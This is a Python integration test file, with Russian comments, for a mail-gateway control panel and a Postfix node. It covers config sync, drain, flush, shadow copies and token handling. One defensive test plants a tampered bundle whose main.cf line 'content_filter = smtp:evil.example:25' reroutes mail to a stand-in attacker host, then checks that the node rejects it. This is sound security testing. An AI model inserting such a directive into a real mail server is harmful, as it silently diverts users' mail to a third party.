"""Панель управления и узел шлюза вместе (ТЗ 1.1 §37–§42, §68.16–§68.18).

Панель — настоящее приложение API, узел — настоящий контейнер Postfix с агентом, синхронизацией и
сборщиком копий. Проверяется то, что по отдельности не видно: что назначенная в панели
конфигурация доходит до работающего узла и меняет его поведение; что команды слива и повтора
доставки исполняются; что копии писем попадают в панель; что недоступная панель, неверный токен и
враждебный пакет не мешают почте и не ломают узел.
"""

from __future__ import annotations

import base64
import smtplib
import time
import uuid
from collections.abc import Iterator

import pytest
from msp_gateway.bundle import bundle_checksum

from .harness import LAB_RECIPIENTS, Stack, lab_spec, make_message
from .panel import Panel

CSV_HEAD = "address,kind,aliases\n"
BASE_ROWS = (
    "ivan@corp.example,USER,i.petrov@corp.example\n"
    "shared@corp.example,SHARED_MAILBOX,\n"
    "all-staff@corp.example,GROUP,\n"
)


@pytest.fixture(scope="module")
def panel(tmp_path_factory) -> Iterator[Panel]:  # type: ignore[no-untyped-def]
    server = Panel(tmp_path_factory.mktemp("panel"))
    server.start()
    yield server
    server.close()


@pytest.fixture(scope="module")
def connected(panel: Panel, tmp_path_factory) -> Iterator[Stack]:  # type: ignore[no-untyped-def]
    stack = Stack(tmp_path_factory.mktemp("gwpanel"), panel_port=panel.port, panel_token=panel.token)
    try:
        stack.up(lab_spec(), LAB_RECIPIENTS)
        yield stack
    finally:
        stack.down()


def publish(admin, rows: str = BASE_ROWS, *, confirm: bool = True) -> int:  # type: ignore[no-untyped-def]
    """Назначить узлам справочник и конфигурацию так, как это делает администратор."""
    synced = admin.post(
        "/api/v1/gateway/recipients/sync",
        {"format": "csv", "content": CSV_HEAD + rows, "source": "test", "confirm_shrink": confirm},
    )
    assert synced.status_code == 200, synced.text
    spec = lab_spec().model_dump(mode="json")
    validated = admin.post("/api/v1/gateway/config/validate", {"spec": spec, "note": "тест"}).json()
    assert validated["ok"], validated
    activated = admin.post("/api/v1/gateway/config/activate", {"version": validated["version"]})
    assert activated.status_code == 200, activated.text
    return int(validated["version"])


def accepted(stack: Stack, rcpt: str) -> bool:
    """Принимает ли шлюз получателя. Письмо не передаётся: сессия закрывается после RCPT, поэтому
    опрос в цикле не порождает ни писем, ни их копий (иначе проверка сама засоряла бы панель)."""
    client = smtplib.SMTP("127.0.0.1", stack.ports["GW_PORT_IN"], timeout=20)
    try:
        client.ehlo("external.example")
        code, _ = client.mail("a@partner.example")
        if code >= 400:
            return False
        code, _ = client.rcpt(rcpt)
        return code < 400
    except (smtplib.SMTPException, OSError):
        return False
    finally:
        try:
            client.quit()
        except (smtplib.SMTPException, OSError):
            client.close()


def accepted_by_sending(stack: Stack, rcpt: str) -> bool:
    sender = "a@partner.example"
    try:
        refused = stack.send_external(
            sender, [rcpt], make_message(f"pi-{uuid.uuid4().hex[:8]}", sender, rcpt)
        )
    except smtplib.SMTPRecipientsRefused:
        return False
    except (smtplib.SMTPException, OSError):
        return False
    return not refused


def node_view(admin, stack: Stack) -> dict:  # type: ignore[no-untyped-def,type-arg]
    nodes = admin.get("/api/v1/gateway/nodes").json()["items"]
    return nodes[0] if nodes else {}


class TestNodeAndPanelAgree:
    def test_the_node_registers_and_reports_itself(self, panel: Panel, connected: Stack) -> None:
        with panel.admin_client() as admin:
            connected.wait_until(
                lambda: node_view(admin, connected).get("state") == "UP",
                timeout=120,
                what="узел виден панели как работающий",
            )
            node = node_view(admin, connected)
        assert node["config_version"]
        assert node["pressure"] in {"NORMAL", "PRESSURE"}

    def test_a_directory_published_in_the_panel_changes_what_the_running_gateway_accepts(
        self, panel: Panel, connected: Stack
    ) -> None:
        with panel.admin_client() as admin:
            assert accepted(connected, "newbie@corp.example") is False
            publish(admin, BASE_ROWS + "newbie@corp.example,USER,\n")
            connected.wait_until(
                lambda: accepted(connected, "newbie@corp.example"),
                timeout=90,
                what="новый адрес принимается после назначения в панели",
            )
            connected.wait_until(
                lambda: (node_view(admin, connected).get("last_apply") or {}).get("outcome") == "ACTIVE",
                timeout=60,
                what="узел сообщил панели, что конфигурация применена",
            )
            publish(admin, BASE_ROWS)
            connected.wait_until(
                lambda: not accepted(connected, "newbie@corp.example"),
                timeout=90,
                what="убранный адрес снова отвергается",
            )

    def test_drain_and_resume_from_the_panel(self, panel: Panel, connected: Stack) -> None:
        with panel.admin_client() as admin:
            publish(admin)
            node_id = node_view(admin, connected)["id"]
            assert admin.post(f"/api/v1/gateway/nodes/{node_id}/drain").status_code == 200
            connected.wait_until(
                lambda: not accepted(connected, "ivan@corp.example"),
                timeout=90,
                what="слив исполнен: приём остановлен",
            )
            connected.wait_until(
                lambda: node_view(admin, connected)["pressure"] == "DRAINING",
                timeout=90,
                what="панель видит слив",
            )
            assert admin.post(f"/api/v1/gateway/nodes/{node_id}/resume").status_code == 200
            connected.wait_until(
                lambda: accepted(connected, "ivan@corp.example"), timeout=90, what="приём восстановлен"
            )

    def test_flush_from_the_panel_retries_deferred_mail(self, panel: Panel, connected: Stack) -> None:
        with panel.admin_client() as admin:
            publish(admin)
            node_id = node_view(admin, connected)["id"]
            for control in (connected.exchange1, connected.exchange2):
                control.reset()
                control.mode("tempfail")
            mid = f"fl-{uuid.uuid4().hex[:8]}"
            sender = "a@partner.example"
            connected.send_external(
                sender, ["ivan@corp.example"], make_message(mid, sender, "ivan@corp.example")
            )
            connected.wait_until(lambda: connected.queue_size() >= 1, what="письмо отложено")
            for control in (connected.exchange1, connected.exchange2):
                control.mode("accept")
            assert admin.post(f"/api/v1/gateway/nodes/{node_id}/flush").status_code == 200
            assert connected.exchange1.wait_for(f"<{mid}@lab.example>", timeout=90) is not None
            connected.wait_until(
                lambda: node_view(admin, connected)["flush_requested"] is False,
                timeout=60,
                what="панель знает, что повтор выполнен",
            )


class TestShadowCopiesReachThePanel:
    def test_a_delivered_message_arrives_in_the_panel_exactly_once(
        self, panel: Panel, connected: Stack
    ) -> None:
        with panel.admin_client() as admin:
            publish(admin)
            mid = f"sh-{uuid.uuid4().hex[:8]}"
            sender = "a@partner.example"
            assert (
                connected.send_external(
                    sender, ["ivan@corp.example"], make_message(mid, sender, "ivan@corp.example")
                )
                == {}
            )
            assert connected.exchange1.wait_for(f"<{mid}@lab.example>", timeout=60) is not None

            def listed() -> list[dict]:  # type: ignore[type-arg]
                found = admin.get(
                    "/api/v1/gateway/messages", params={"internet_message_id": f"<{mid}@lab.example>"}
                )
                return list(found.json()["items"])

            try:
                connected.wait_until(
                    lambda: len(listed()) >= 1, timeout=90, what="копия письма дошла до панели"
                )
            except TimeoutError:
                from msp_api.db.models_transport import TransportMessage

                with panel.database() as session:
                    stored = [
                        (m.internet_message_id, m.state.value) for m in session.query(TransportMessage).all()
                    ]
                status = connected.exec("cat /var/lib/msp/status/collector.json", check=False).stdout
                pending = connected.exec(
                    "ls -la /var/lib/msp/journal/new /var/lib/msp/journal/bad", check=False
                ).stdout
                raise AssertionError(
                    f"копия не дошла. В панели: {stored}. Сборщик: {status}. Журнал: {pending}"
                ) from None
            time.sleep(8)
            found = listed()
            assert len(found) == 1, "повтор отправки не создаёт вторую запись"
            assert found[0]["direction"] == "INBOUND"
            assert "body" not in found[0] and "raw" not in found[0]

    def test_an_unreachable_panel_delays_the_copy_but_never_the_mail(
        self, panel: Panel, connected: Stack
    ) -> None:
        with panel.admin_client() as admin:
            publish(admin)
        panel.stop()
        try:
            mid = f"out-{uuid.uuid4().hex[:8]}"
            sender = "a@partner.example"
            assert (
                connected.send_external(
                    sender, ["ivan@corp.example"], make_message(mid, sender, "ivan@corp.example")
                )
                == {}
            )
            assert connected.exchange1.wait_for(f"<{mid}@lab.example>", timeout=60) is not None, (
                "почта идёт без панели"
            )
            connected.wait_until(
                lambda: int(connected.exec("ls /var/lib/msp/journal/new | wc -l").stdout.strip() or 0) >= 1,
                timeout=30,
                what="копия ждёт в журнале",
            )
        finally:
            panel.restart()
        with panel.admin_client() as admin:
            connected.wait_until(
                lambda: bool(
                    admin.get(
                        "/api/v1/gateway/messages", params={"internet_message_id": f"<{mid}@lab.example>"}
                    ).json()["items"]
                ),
                timeout=120,
                what="копия дошла после возвращения панели",
            )
            connected.wait_until(
                lambda: node_view(admin, connected).get("state") == "UP",
                timeout=90,
                what="узел снова на связи",
            )


class TestWhatTheNodeRefuses:
    def test_a_hostile_bundle_from_the_panel_is_rejected_and_the_node_keeps_working(
        self, panel: Panel, connected: Stack
    ) -> None:
        from msp_api.db.models_transport import TransportConfigStatus, TransportConfigVersion
        from sqlalchemy import select

        with panel.admin_client() as admin:
            publish(admin)
        before = connected.exec("python3 -m msp_gateway.node status").stdout
        with panel.database() as session:
            current = session.execute(
                select(TransportConfigVersion).where(
                    TransportConfigVersion.status == TransportConfigStatus.ACTIVE
                )
            ).scalar_one()
            files = dict(current.bundle["files"])
            files["main.cf"] += "\ncontent_filter = smtp:evil.example:25\n"
            manifest = dict(current.bundle["manifest"])
            # Контрольная сумма пересчитана: пакет «честный» с точки зрения целостности, и защитой
            # остаётся только проверка содержимого на узле.
            manifest["checksum"] = bundle_checksum({k: v.encode() for k, v in files.items()})
            evil = TransportConfigVersion(
                organization_id=current.organization_id,
                version=current.version + 1,
                status=TransportConfigStatus.ACTIVE,
                spec=current.spec,
                checksum=manifest["checksum"],
                bundle={"files": files, "manifest": manifest},
                created_by="attacker",
            )
            current.status = TransportConfigStatus.SUPERSEDED
            session.add(evil)
            session.commit()
        with panel.admin_client() as admin:
            connected.wait_until(
                lambda: (
                    (node_view(admin, connected).get("last_apply") or {}).get("outcome")
                    in {"FAILED", "ROLLED_BACK", "REJECTED"}
                ),
                timeout=90,
                what="узел отверг пакет и сообщил об этом",
            )
        assert connected.exec("python3 -m msp_gateway.node status").stdout == before, (
            "действующая конфигурация не изменилась"
        )
        assert "evil.example" not in connected.exec("cat /var/lib/msp/config/active/main.cf").stdout
        assert accepted(connected, "ivan@corp.example"), "узел продолжает принимать почту"

    def test_a_wrong_token_changes_nothing(self, panel: Panel, connected: Stack) -> None:
        import httpx

        response = httpx.get(
            f"http://127.0.0.1:{panel.port}/api/v1/gateway-agent/config",
            params={"node_id": "a" * 32},
            headers={"Authorization": "Bearer wrong"},
        )
        assert response.status_code == 401

    def test_the_token_is_not_in_the_metrics_or_the_outbox(self, panel: Panel, connected: Stack) -> None:
        import urllib.request

        url = f"http://127.0.0.1:{connected.ports['GW_PORT_METRICS']}/metrics"
        with urllib.request.urlopen(url, timeout=10) as response:
            metrics = response.read().decode()
        outbox = connected.exec("cat /var/lib/msp/agent/outbox.jsonl 2>/dev/null || true", check=False).stdout
        for text in (metrics, outbox):
            assert panel.token not in text
            assert base64.b64encode(panel.token.encode()).decode() not in text
